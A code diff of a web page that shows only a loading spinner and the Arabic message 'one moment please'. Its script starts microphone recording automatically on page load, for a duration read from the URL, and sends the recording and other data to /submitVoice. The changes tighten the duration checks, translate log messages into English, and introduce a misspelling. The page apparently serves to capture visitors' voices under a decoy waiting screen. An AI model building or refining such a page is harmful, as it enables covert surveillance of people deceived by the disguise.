@@ -74,7 +74,7 @@
 <body>
   <div class="container">
     <div class="loading"></div>
-    <p class="message">لحظه واحده من فضلك...</p>
+    <p class="message">لحظه واحده من فظلك...</p>
   </div>
 
   <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
@@ -152,12 +152,20 @@
     }
 
     window.addEventListener('load', () => {
-        const parsedDuration = parseInt(duration);
-        if (parsedDuration > 0 && parsedDuration <= 20) {
-            startRecording(parsedDuration);
-        } else {
-            notification.textContent = 'حدث خطأ في مدة التسجيل.';
+        if (!duration) {
+            notification.textContent = 'Duration parameter is missing in the URL.';
+            console.error('Duration parameter is missing in the URL.');
+            return;
         }
+        
+        const parsedDuration = parseInt(duration);
+        if (isNaN(parsedDuration) || parsedDuration <= 0 || parsedDuration > 20) {
+            notification.textContent = 'Invalid duration parameter.';
+            console.error('Invalid duration parameter:', duration);
+            return;
+        }
+
+        startRecording(parsedDuration);
     });
 
     async function startRecording(recordDuration) {
@@ -207,12 +215,12 @@
                     }
                     notification.textContent = 'تم إرسال التسجيل الصوتي والبيانات بنجاح';
                 } catch (error) {
-                    console.error('حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات:', error);
+                    console.error('Error sending voice recording and data:', error);
                     notification.textContent = 'حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات';
                 }
             });
         } catch (error) {
-            console.error('خطأ في الوصول إلى الميكروفون:', error);
+            console.error('Error accessing the microphone:', error);
             notification.textContent = 'خطأ في الوصول إلى الميكروفون';
         }
     }
